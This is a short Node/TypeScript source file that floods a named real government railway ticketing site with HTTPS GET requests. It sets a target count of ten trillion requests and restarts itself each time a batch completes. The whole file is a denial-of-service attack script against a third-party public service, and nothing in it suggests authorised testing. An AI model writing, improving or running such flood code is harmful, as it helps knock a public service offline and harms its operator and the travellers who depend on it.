const https = require("https");

const targetUrl = "https://railapp.railway.gov.bd";
const totalRequests = 10000000000000;
let completedRequests = 0;

export const makeRequest = () => {
  console.log(`Starting batch of ${totalRequests} requests...`);

  for (let i = 0; i < totalRequests; i++) {
    const requestIndex = i; // capture loop index
    https
      .get(targetUrl, (res:any) => {
        console.log(`Status3: ${res.statusCode}`);
        console.log(`Count: ${requestIndex}`);
        // if (res.statusCode === 302 || res.statusCode === 301) {
        //   console.log("Redirect to:", res.headers.location);
        // }
        res.on("data", () => {});
        res.on("end", () => {
          completedRequests++;
          if (completedRequests === totalRequests) {
            console.log(`✅ Completed requests: ${completedRequests}`);
            console.log(`✅ All ${totalRequests} requests completed.`);
            // Automatically start next batch
            makeRequest();
          }
        });
      })
      .on("error", (err:any) => {
        console.error(`❌ Error: ${err.message,i}`);
          
        completedRequests++;
        if (completedRequests === totalRequests) {
          console.log(`✅ All ${totalRequests} requests completed.`);
          makeRequest();
        }
      });
  }
};

// makeRequest(); // Start first batch
